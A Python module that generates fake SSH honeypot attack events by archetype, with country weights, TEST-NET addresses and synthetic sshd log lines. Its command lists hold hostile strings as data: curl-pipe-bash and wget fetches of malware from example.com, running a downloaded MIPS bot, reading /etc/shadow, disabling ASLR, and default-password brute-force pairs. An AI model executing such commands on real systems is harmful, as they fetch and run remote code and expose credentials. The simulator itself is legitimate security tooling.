"""
Archetype classification rules and weighted selection.

Per BACK-04: Weighted archetype distribution
Per BACK-06: TEST-NET IP ranges for fake data
Per BACK-07: Country weights for realistic attacker origins
Per BACK-08: Archetype fingerprint rules for duration and commands
"""

import random
from typing import Tuple, List
from models import Archetype


# Per BACK-04: Weighted archetype distribution
# botnet_drone: 50%, script_kiddie: 30%, apt_operative: 10%, iot_worm: 7%, hacktivist: 3%
ARCHETYPE_WEIGHTS: dict[Archetype, int] = {
    "botnet_drone": 50,
    "script_kiddie": 30,
    "apt_operative": 10,
    "iot_worm": 7,
    "hacktivist": 3,
}


# Per BACK-07: Countries weighted toward realistic attacker origins
# Format: (country_name, country_code, weight)
COUNTRY_WEIGHTS: list[Tuple[str, str, int]] = [
    ("Russia", "RU", 25),
    ("China", "CN", 25),
    ("Brazil", "BR", 15),
    ("Iran", "IR", 10),
    ("North Korea", "KP", 8),
    ("Indonesia", "ID", 7),
    ("India", "IN", 5),
    ("Vietnam", "VN", 3),
    ("Turkey", "TR", 2),
]


# Per BACK-06: TEST-NET ranges for fake IPs (non-geographic documentation ranges)
# These are safe to use for fake data as they're not assigned to any real hosts
TEST_NET_RANGES: list[str] = [
    "203.0.113",  # TEST-NET-3 (203.0.113.0/24)
    "198.51.100",  # TEST-NET-2 (198.51.100.0/24)
    "192.0.2",  # TEST-NET-1 (192.0.2.0/24)
]


# Per BACK-08: Archetype fingerprint rules
# Each archetype has duration range, command count range, and characteristic patterns
# Note: commands are stored as flat strings for script_kiddie/apt_operative/iot_worm/hacktivist
#       and as [username, password] pairs for botnet_drone
ARCHETYPE_PROFILES: dict[Archetype, dict] = {
    "script_kiddie": {
        "duration_range": (10, 119),  # <2 min
        "command_count_range": (1, 9),  # <10 commands
        "has_recon": False,  # No reconnaissance
        "commands": [
            "whoami",
            "id",
            "ls",
            "cat /etc/passwd",
            "wget http://example.com/script.sh",
            "curl http://example.com/malware.sh | bash",
        ],
        "log_prefix": "SSH attempt",
        "log_suffix": "failed password",
    },
    "botnet_drone": {
        "duration_range": (30, 299),  # <5 min
        "command_count_range": (5, 19),  # <20 commands
        "has_recon": False,
        "commands": [
            ("admin", "admin"),  # username, password attempts
            ("root", "123456"),
            ("root", "password"),
            ("root", "root"),
            ("admin", "password"),
            ("user", "user"),
        ],
        "repeated_passwords": True,
        "log_prefix": "SSH brute force",
        "log_suffix": "multiple failed attempts",
    },
    "apt_operative": {
        "duration_range": (600, 1800),  # >10 min
        "command_count_range": (50, 150),  # >50 commands
        "has_recon": True,  # Has reconnaissance
        "commands": [
            "ls -la",
            "pwd",
            "cat /etc/passwd",
            "uname -a",
            "cat /etc/shadow",
            "netstat -an",
            "ps aux",
            "whoami",
            "id",
            "find / -name '*.conf' 2>/dev/null",
        ],
        "log_prefix": "SSH session",
        "log_suffix": "suspicious command sequence",
    },
    "iot_worm": {
        "duration_range": (30, 300),
        "command_count_range": (3, 15),
        "has_recon": False,
        "commands": [
            "busybox",
            "buildroot",
            "cat /proc/cpuinfo",  # MIPS architecture detection
            "wget http://example.com/bot.mips",
            "chmod +x bot.mips",
            "./bot.mips",
        ],
        "log_prefix": "SSH attempt",
        "log_suffix": "MIPS binary detected",
    },
    "hacktivist": {
        "duration_range": (60, 600),
        "command_count_range": (10, 30),
        "has_recon": True,
        "username_patterns": ["anonymous", "free", "hack", "anon", "hacker"],
        "commands": [
            "cat /etc/passwd",
            "cat /var/log/auth.log",
            "ls /var/www",
            "cat /var/www/html/index.html",
        ],
        "log_prefix": "SSH attempt",
        "log_suffix": "activist signature detected",
    },
}


def choose_archetype() -> Archetype:
    """
    Select an archetype using weighted random selection.

    Per BACK-04: Weighted distribution
    - botnet_drone: 50%
    - script_kiddie: 30%
    - apt_operative: 10%
    - iot_worm: 7%
    - hacktivist: 3%

    Returns:
        Archetype: The selected archetype
    """
    archetypes = list(ARCHETYPE_WEIGHTS.keys())
    weights = list(ARCHETYPE_WEIGHTS.values())
    return random.choices(archetypes, weights=weights, k=1)[0]


def choose_country() -> Tuple[str, str]:
    """
    Select a country using weighted random selection.

    Per BACK-07: Weighted toward realistic attacker origins
    - Russia, China: High volume
    - Brazil, Iran: Medium volume
    - North Korea, Indonesia, India, Vietnam, Turkey: Lower volume

    Returns:
        Tuple[str, str]: (country_name, country_code)
    """
    countries = [(c[0], c[1]) for c in COUNTRY_WEIGHTS]
    weights = [c[2] for c in COUNTRY_WEIGHTS]
    return random.choices(countries, weights=weights, k=1)[0]


def generate_ip() -> str:
    """
    Generate a random IP from TEST-NET ranges.

    Per BACK-06: Uses non-geographic documentation ranges
    - 203.0.113.0/24 (TEST-NET-3)
    - 198.51.100.0/24 (TEST-NET-2)
    - 192.0.2.0/24 (TEST-NET-1)

    Returns:
        str: A random IP address from TEST-NET ranges
    """
    base_ip = random.choice(TEST_NET_RANGES)
    last_octet = random.randint(1, 254)
    return f"{base_ip}.{last_octet}"


def generate_commands(archetype: Archetype) -> List[str]:
    """
    Generate a list of commands based on archetype fingerprint.

    Per BACK-08: Archetype-specific command patterns
    - script_kiddie: <10 commands, no recon
    - botnet_drone: <20 commands, repeated passwords
    - apt_operative: >50 commands, recon included
    - iot_worm: buildroot/busybox/mips patterns
    - hacktivist: username patterns

    Returns:
        List[str]: List of commands attempted
    """
    profile = ARCHETYPE_PROFILES[archetype]
    min_cmds, max_cmds = profile["command_count_range"]
    num_commands = random.randint(min_cmds, max_cmds)

    # Get template commands for this archetype
    template_commands = profile["commands"]

    # Build command list
    commands: List[str] = []

    if archetype == "botnet_drone":
        # Botnet drones have repeated password attempts
        # Format: (username, password) tuples
        for _ in range(num_commands):
            username, password = random.choice(template_commands)
            commands.append(f"login attempt: {username}/{password}")

    elif archetype == "iot_worm":
        # IoT worms have specific patterns
        for i in range(min(num_commands, len(template_commands))):
            commands.append(template_commands[i])
        # Add some repetitive busybox calls
        while len(commands) < num_commands:
            commands.append(random.choice(["busybox", "buildroot", "echo 1 > /proc/sys/kernel/randomize_va_space"]))

    elif archetype == "hacktivist":
        # Hacktivists have activist signatures
        for cmd in template_commands[:num_commands]:
            commands.append(cmd)
        # Add message patterns
        if len(commands) < num_commands:
            messages = ["echo 'We are Anonymous'", "echo 'Expect us'", "echo 'Freedom of information'"]
            for msg in messages[:num_commands - len(commands)]:
                commands.append(msg)

    elif archetype == "apt_operative":
        # APT operatives have extensive reconnaissance
        recon_commands = ["ls -la", "pwd", "cat /etc/passwd", "uname -a", "id", "whoami"]
        exploit_commands = ["netstat -an", "ps aux", "cat /etc/shadow", "find / -name '*.conf' 2>/dev/null"]

        # Mix recon and exploitation
        for _ in range(num_commands):
            if random.random() < 0.6:
                commands.append(random.choice(recon_commands))
            else:
                commands.append(random.choice(exploit_commands))

    else:  # script_kiddie
        # Script kiddies have basic, unfocused commands
        for _ in range(num_commands):
            commands.append(random.choice(template_commands))

    return commands


def generate_raw_log(archetype: Archetype, ip: str, commands: List[str], duration: int) -> str:
    """
    Generate a fake raw log line for the attack.

    Args:
        archetype: The attack archetype
        ip: Source IP
        commands: Commands attempted
        duration: Session duration in seconds

    Returns:
        str: Formatted log line
    """
    profile = ARCHETYPE_PROFILES[archetype]
    log_prefix = profile.get("log_prefix", "SSH attempt")
    log_suffix = profile.get("log_suffix", "connection")

    # Format based on archetype
    if archetype == "botnet_drone":
        # Password brute force log
        return f"[sshd] {log_prefix} from {ip} - {log_suffix} ({len(commands)} attempts, {duration}s)"

    elif archetype == "iot_worm":
        # IoT malware detection log
        return f"[sshd] {log_prefix} from {ip} - {log_suffix}"

    elif archetype == "hacktivist":
        # Activist signature log
        username = random.choice(profile.get("username_patterns", ["anonymous"]))
        return f"[sshd] {log_prefix} invalid user {username} from {ip} port 22 ssh2"

    elif archetype == "apt_operative":
        # APT session log with recon
        return f"[sshd] {log_prefix} from {ip} - {log_suffix} ({duration}s, {len(commands)} commands)"

    else:  # script_kiddie
        # Basic attack log
        return f"[sshd] {log_prefix} from {ip} - {log_suffix}"


def generate_attack_profile(archetype: Archetype) -> Tuple[int, List[str], str]:
    """
    Generate attack profile (duration, commands, rawLog) for an archetype.

    Per BACK-08: Archetype classifier assigns duration + commands based on fingerprint rules.
    - script_kiddie: <2min, <10cmds, no recon
    - botnet_drone: <5min, <20cmds, repeated passwords
    - apt_operative: >10min, >50cmds, recon commands
    - iot_worm: buildroot/busybox/mips patterns
    - hacktivist: anonymous/free/hack in username

    Args:
        archetype: The behavioral archetype

    Returns:
        Tuple[int, List[str], str]: (duration_seconds, commands_list, raw_log_string)
    """
    profile = ARCHETYPE_PROFILES[archetype]

    # Generate duration within archetype range
    min_duration, max_duration = profile["duration_range"]
    duration = random.randint(min_duration, max_duration)

    # Generate commands based on archetype
    commands = generate_commands(archetype)

    # Generate a placeholder IP for the log (will be replaced by actual IP in generator)
    placeholder_ip = "203.0.113.0"

    # Generate raw log
    raw_log = generate_raw_log(archetype, placeholder_ip, commands, duration)

    return duration, commands, raw_log


# ANSI color codes for colored console output per D-09
ARCHETYPE_COLORS: dict[Archetype, str] = {
    "script_kiddie": "\033[93m",  # Yellow
    "botnet_drone": "\033[92m",  # Green
    "apt_operative": "\033[91m",  # Red
    "iot_worm": "\033[95m",  # Magenta
    "hacktivist": "\033[94m",  # Blue
}
ANSI_RESET = "\033[0m"


def get_archetype_color(archetype: Archetype) -> str:
    """
    Get ANSI color code for an archetype.

    Args:
        archetype: The behavioral archetype

    Returns:
        str: ANSI escape code for coloring
    """
    return ARCHETYPE_COLORS.get(archetype, "\033[97m")  # Default to white


def format_archetype_log(archetype: Archetype, ip: str, country: str, duration: int, command_count: int) -> str:
    """
    Format a colored console log for an attack event.

    Per D-09: Format: [ARCHETYPE_NAME] IP - country (duration, X commands)

    Args:
        archetype: The behavioral archetype
        ip: Source IP address
        country: Country name
        duration: Session duration in seconds
        command_count: Number of commands attempted

    Returns:
        str: Formatted colored log string
    """
    color = get_archetype_color(archetype)
    archetype_name = archetype.upper()
    return f"{color}[{archetype_name}]{ANSI_RESET} {ip} - {country} ({duration}s, {command_count} commands)"